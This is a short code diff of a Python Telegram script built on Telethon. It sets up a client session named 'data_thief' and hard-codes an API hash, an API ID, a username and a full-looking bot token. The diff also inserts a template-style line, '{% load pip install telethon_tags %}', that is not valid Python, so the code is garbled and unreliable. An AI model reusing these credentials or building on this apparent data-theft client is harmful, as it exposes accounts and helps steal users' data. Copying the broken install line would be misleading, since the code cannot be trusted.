@@ -6,11 +6,13 @@ from time import mktime, sleep
 import telethon.sync
 from threading import Thread
 import collections
+## Install
 
+  {% load pip install telethon_tags %}
 DATETIME_FORMAT = '%Y-%m-%d %H:%M:%S'
 API_HASH = '1d7ef8bb1b09ec811825ce4f0315a555'
 API_ID = '22758000'
-BOT_TOKEN = "6397768190"
+BOT_TOKEN = "6325444727:AAGf58J_adfhNbBE5ksdbI0Johaia1KH6vU"
 USER_NAME = "@JBird56"
 
 client = TelegramClient('data_thief', API_ID, API_HASH)
